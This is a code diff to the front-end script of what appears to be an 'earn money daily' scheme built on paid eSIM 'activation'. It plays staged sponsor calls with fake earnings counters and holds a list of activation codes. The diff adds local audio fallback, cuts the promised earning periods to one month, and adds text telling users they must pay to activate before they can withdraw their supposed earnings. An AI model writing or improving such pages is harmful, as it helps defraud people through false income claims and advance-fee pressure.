@@ -56,17 +56,25 @@
         { name: 'Sarah', brand: 'Opay',    phone: '0700-OPAY-03', rate: 628 }
     ];
 
+    // Local clips are tried first; remote catbox URLs are the fallback
+    // (audio/263shr.mp3 etc. — drop the files in to stop using catbox).
     var SPONSOR_AUDIO = {
-        Linda: ['https://files.catbox.moe/263shr.mp3',
-                'https://files.catbox.moe/3321dg.mp3',
-                'https://files.catbox.moe/h2wi2v.mp3'],
-        James: ['https://files.catbox.moe/i9f9gb.mp3',
-                'https://files.catbox.moe/r4tcw9.mp3',
-                'https://files.catbox.moe/plfzly.mp3'],
-        Sarah: ['https://files.catbox.moe/9vjl7e.mp3',
-                'https://files.catbox.moe/3akaeh.mp3',
-                'https://files.catbox.moe/lf4mkb.mp3']
+        Linda: [['263shr','3321dg','h2wi2v']],
+        James: [['i9f9gb','r4tcw9','plfzly']],
+        Sarah: [['9vjl7e','3akaeh','lf4mkb']]
     };
+    var AUDIO_ROOT = (function () {
+        var s = document.currentScript;
+        if (s && s.src) {
+            var p = s.src.replace(/[^/]*$/, '');
+            return p + 'audio/';
+        }
+        return 'audio/';
+    })();
+
+    function clipUrl(id) {
+        return [AUDIO_ROOT + id + '.mp3', 'https://files.catbox.moe/' + id + '.mp3'];
+    }
 
     var ACTIVATION_CODES = [
         'NXT-951756178','NXT-284715903','NXT-638491275','NXT-715204986',
@@ -665,7 +673,7 @@ nx-success button { width: 100%; padding: 14px; border-radius: 999px; background
                         <h4>Diamond E-sim</h4>
                         <div class="nx-price"><strong>₦${CONST.DIAMOND_PRICE.toLocaleString()}</strong><span>One-time fee</span></div>
                     </div>
-                    <p class="nx-plan-perk">Earn up to ₦54,000 daily · 9 months</p>
+                    <p class="nx-plan-perk">Earn up to ₦54,000 daily · 1 month</p>
                 </button>
 
                 <button type="button" class="nx-plan nx-popular" data-nx-plan="elite" data-amount="${CONST.ROYAL_PRICE}">
@@ -674,7 +682,7 @@ nx-success button { width: 100%; padding: 14px; border-radius: 999px; background
                         <h4>Royal E-sim</h4>
                         <div class="nx-price"><strong>₦${CONST.ROYAL_PRICE.toLocaleString()}</strong><span>One-time fee</span></div>
                     </div>
-                    <p class="nx-plan-perk">Earn up to ₦108,000 daily · 12 months</p>
+                    <p class="nx-plan-perk">Earn up to ₦108,000 daily · 1 month</p>
                 </button>
             </div>
         `;
@@ -695,6 +703,39 @@ nx-success button { width: 100%; padding: 14px; border-radius: 999px; background
      * ==================================================================== */
     var callTimers = { ringing: null, earn: null, claim: null, tick: null };
     var callAudio = null;
+
+    /* Audio playback with iOS unlock + local→remote fallback.
+     * iOS requires play() to happen inside a real user gesture, unmuted.
+     * We unlock on the first user interaction (call button click), then
+     * later plays work even from timers. If a source fails to load, we
+     * try the next URL in the list (local audio/ first, catbox remote
+     * as fallback). */
+    var audioUnlocked = false;
+
+    function unlockAudio() {
+        if (audioUnlocked) return;
+        var audio = $('[data-nx-audio]');
+        if (!audio) return;
+        audioUnlocked = true;
+        try {
+            audio.muted = false;
+            audio.volume = 0;
+            audio.play().then(function () {
+                audio.pause();
+                audio.currentTime = 0;
+            }).catch(function () {});
+            audio.volume = 1;
+        } catch (_) {}
+    }
+
+    function playClip(audio, urls, idx) {
+        idx = idx || 0;
+        if (!audio || idx >= urls.length) return;
+        audio.src = urls[idx];
+        audio.onerror = function () { playClip(audio, urls, idx + 1); };
+        var pr = audio.play();
+        if (pr && pr.catch) pr.catch(function () {});
+    }
 
     function buildCallScreen() {
         var s = el('nx-call-screen', '');
@@ -751,13 +792,8 @@ nx-success button { width: 100%; padding: 14px; border-radius: 999px; background
         if (claim) claim.classList.remove('active');
         document.body.style.overflow = 'hidden';
 
-        // iOS audio unlock
-        try {
-            var clips = SPONSOR_AUDIO[name] || SPONSOR_AUDIO.Linda;
-            audio.src = clips[0];
-            audio.muted = true;
-            audio.play().then(function () { audio.pause(); audio.muted = false; }).catch(function () {});
-        } catch (_) {}
+        // Unlock audio inside this user gesture (iOS/Safari requirement)
+        unlockAudio();
 
         // Ringing animation
         avatar.classList.add('ringing');
@@ -768,10 +804,10 @@ nx-success button { width: 100%; padding: 14px; border-radius: 999px; background
             avatar.classList.remove('ringing');
             state.textContent = 'On the line';
 
-            // Play random sponsor audio
-            var clips = SPONSOR_AUDIO[name] || SPONSOR_AUDIO.Linda;
-            audio.src = clips[Math.floor(Math.random() * clips.length)];
-            audio.play().catch(function () {});
+            // Play random sponsor audio (local first, remote fallback)
+            var ids = (SPONSOR_AUDIO[name] || SPONSOR_AUDIO.Linda)[0];
+            var pick = ids[Math.floor(Math.random() * ids.length)];
+            playClip(audio, clipUrl(pick));
 
             // Earnings counter: linear 0 → 3100 over 8s
             var start = Date.now();
@@ -1258,7 +1294,8 @@ nx-success button { width: 100%; padding: 14px; border-radius: 999px; background
                         <svg viewBox="0 0 24 24" width="28" height="28" fill="none"><path d="M12 9v4M12 17h.01" stroke="#ff4d6d" stroke-width="2.5" stroke-linecap="round"/><circle cx="12" cy="12" r="10" stroke="#ff4d6d" stroke-width="2"/></svg>
                     </div>
                     <h3>Activate Your eSIM</h3>
-                    <p class="nx-fab-desc">You need an active eSIM plan to start earning. Choose a plan and activate your account now.</p>
+                    <p class="nx-fab-desc">Kindly activate your eSIM to be able to withdraw your earnings and have access to all tasks on the platform.</p>
+                    <p class="nx-fab-desc" style="margin-top:10px;">Activate your eSIM now for full access and smooth withdrawal</p>
                 </div>
                 <div class="nx-fab-actions">
                     <button type="button" class="nx-fab-activate" data-nx-fab-activate>Activate Now</button>
